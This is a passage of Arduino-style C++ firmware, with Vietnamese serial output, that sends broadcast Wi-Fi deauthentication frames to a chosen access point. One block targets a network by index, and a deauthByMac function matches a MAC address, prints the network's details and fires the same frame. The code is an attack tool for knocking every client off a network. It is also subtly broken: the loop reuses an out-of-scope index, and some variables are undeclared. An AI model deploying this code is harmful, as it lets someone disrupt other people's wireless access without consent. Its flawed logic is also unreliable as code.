if (target >= 0 && target < static_cast<int>(scan_results.size())) {
            memcpy(deauth_bssid, scan_results[target].bssid, 6);
            wifi_tx_deauth_frame(deauth_bssid, (void*)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
       
        }


void deauthByMac(String mac){


    for (auto &net : scan_results) {
    if (net.bssid_str.equalsIgnoreCase(mac)) {
      Serial.println("✅ Thông tin mạng Wi-Fi tìm thấy:");
      Serial.println("📶 SSID   : " + net.ssid);
      Serial.println("🔗 BSSID  : " + net.bssid_str);
      Serial.println("📡 Kênh   : " + String(net.channel));
      Serial.println("📉 RSSI   : " + String(net.rssi) + " dBm");
      Serial.println("-------------------------------------");
      found = true;

      memcpy(deauth_bssid, scan_results[target].bssid, 6);
            wifi_tx_deauth_frame(deauth_bssid, (void*)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
      break;
    }
  }

      
}